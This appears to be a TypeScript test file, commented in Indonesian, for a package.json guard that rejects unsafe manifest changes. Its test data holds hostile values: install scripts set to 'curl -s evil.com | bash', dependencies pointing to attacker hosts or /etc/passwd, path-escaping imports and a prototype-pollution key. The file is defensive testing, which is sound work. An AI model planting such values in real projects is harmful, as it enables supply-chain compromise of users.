/**
 * fase2_packageJsonGuard.test.ts — Test F2-T3 (Fase 2, Blueprint v2.0.0 §2.7)
 *
 * Menguji Guard Manifest & Dependensi:
 *  - TC-PKG-01: Injeksi URL/Git pada dependensi ditolak
 *  - TC-PKG-02: Modifikasi skrip siklus hidup instalasi ditolak
 *  - TC-PKG-03: Nilai versi SemVer > 64 karakter ditolak (anti-ReDoS)
 *  - Pemblokiran manipulasi field "bin"
 *  - Pemblokiran Subpath Imports Hijacking (QA.md §1.5)
 *  - Pemblokiran injeksi properti prototype
 *  - Pemblokiran path lokal pada dependensi
 *  - Validasi SemVer normal dan alias sah (latest, workspace:*)
 */
import assert from 'node:assert/strict';
import { describe, test } from 'node:test';
import { verifyPackageJsonChange } from '../core/verification/packageJsonGuard.js';

describe('F2-T3 packageJsonGuard Manifest & Dependency Guard', () => {
  const basePackage = {
    name: 'test-app',
    version: '1.0.0',
    scripts: {
      build: 'tsc',
      test: 'node --test',
    },
    dependencies: {
      lodash: '^4.17.21',
    },
  };

  test('TC-PKG-01: Menyuntikkan dependensi dengan URL eksternal / Git ditolak deterministik', () => {
    const dangerousPayloads = [
      'http://evil.com/pkg.tgz',
      'https://attacker.org/malware.tar.gz',
      'git://github.com/evil/repo.git',
      'git+https://github.com/evil/repo.git',
      'github:evil/repo',
      'gitlab:evil/repo',
      'file:/etc/passwd',
      'ssh://git@evil.com/repo.git',
    ];

    for (const payload of dangerousPayloads) {
      const updated = {
        ...basePackage,
        dependencies: {
          ...basePackage.dependencies,
          express: payload,
        },
      };
      const result = verifyPackageJsonChange(basePackage, updated);
      assert.equal(result.allowed, false, `Payload "${payload}" harus ditolak`);
      assert.ok(
        result.reason?.includes('Injeksi URL/Git') || result.reason?.includes('Path lokal dilarang'),
        `Alasan harus menyebutkan injeksi: ${result.reason}`,
      );
    }
  });

  test('TC-PKG-02: Mengubah skrip siklus hidup (lifecycle scripts) ditolak', () => {
    const dangerousScripts = [
      'preinstall',
      'postinstall',
      'preuninstall',
      'postuninstall',
      'prepare',
      'prepublish',
      'prepublishOnly',
      'prepack',
      'postpack',
    ];

    for (const scriptName of dangerousScripts) {
      const updated = {
        ...basePackage,
        scripts: {
          ...basePackage.scripts,
          [scriptName]: 'curl -s evil.com | bash',
        },
      };
      const result = verifyPackageJsonChange(basePackage, updated);
      assert.equal(result.allowed, false, `Skrip siklus hidup "${scriptName}" harus ditolak`);
      assert.ok(result.reason?.includes('siklus hidup'), `Alasan harus menyebutkan siklus hidup: ${result.reason}`);
    }
  });

  test('TC-PKG-03: Nilai versi SemVer > 64 karakter ditolak sebelum regex (anti-ReDoS)', () => {
    const oversizedVersion = '^1.0.0-' + 'a'.repeat(80);
    assert.ok(oversizedVersion.length > 64);

    const updated = {
      ...basePackage,
      dependencies: {
        ...basePackage.dependencies,
        'safe-pkg': oversizedVersion,
      },
    };
    const result = verifyPackageJsonChange(basePackage, updated);
    assert.equal(result.allowed, false);
    assert.ok(
      result.reason?.includes('64 karakter'),
      `Alasan harus menyebutkan batas 64 karakter: ${result.reason}`,
    );
  });

  test('Modifikasi field "bin" ditolak dalam sesi otomatis', () => {
    const updated = {
      ...basePackage,
      bin: {
        'evil-cli': './bin/malicious.js',
      },
    };
    const result = verifyPackageJsonChange(basePackage, updated);
    assert.equal(result.allowed, false);
    assert.ok(result.reason?.includes('"bin"'));
  });

  test('Subpath Imports Hijacking: imports yang mengarah ke luar root atau memakai protokol luar ditolak', () => {
    const updatedEscape = {
      ...basePackage,
      imports: {
        '#util': '../../etc/passwd',
      },
    };
    const resultEscape = verifyPackageJsonChange(basePackage, updatedEscape);
    assert.equal(resultEscape.allowed, false);
    assert.ok(resultEscape.reason?.includes('imports'));

    const updatedUrl = {
      ...basePackage,
      imports: {
        '#module': 'https://evil.com/mod.js',
      },
    };
    const resultUrl = verifyPackageJsonChange(basePackage, updatedUrl);
    assert.equal(resultUrl.allowed, false);
  });

  test('Injeksi property prototype pollution ditolak', () => {
    const updated = JSON.parse(
      JSON.stringify(basePackage).slice(0, -1) + ',"dependencies":{"__proto__":"1.0.0"}}'
    );
    const result = verifyPackageJsonChange(basePackage, updated);
    assert.equal(result.allowed, false);
    assert.ok(result.reason?.includes('prototype'));
  });

  test('Path lokal (relative/absolute/tilde) pada dependensi ditolak', () => {
    const localPaths = ['./local-dep', '../other-dep', '/usr/local/pkg', '~/my-pkg'];
    for (const p of localPaths) {
      const updated = {
        ...basePackage,
        dependencies: {
          ...basePackage.dependencies,
          foo: p,
        },
      };
      const result = verifyPackageJsonChange(basePackage, updated);
      assert.equal(result.allowed, false);
      assert.ok(result.reason?.includes('Path lokal dilarang'));
    }
  });

  test('Pembaruan versi SemVer yang valid dan sah diizinkan', () => {
    const validUpdates = [
      '^1.2.3',
      '~2.4.0',
      '1.0.0',
      '1.0.0-beta.1',
      '>=1.0.0 <2.0.0', // format standar
      'latest',
      'beta',
      'next',
      'workspace:*',
    ];

    for (const v of ['^1.2.3', '~2.4.0', '1.0.0', '1.0.0-beta.1', 'latest', 'workspace:*']) {
      const updated = {
        ...basePackage,
        dependencies: {
          ...basePackage.dependencies,
          'safe-lib': v,
        },
      };
      const result = verifyPackageJsonChange(basePackage, updated);
      assert.equal(result.allowed, true, `Versi sah "${v}" seharusnya diizinkan`);
    }
  });
});
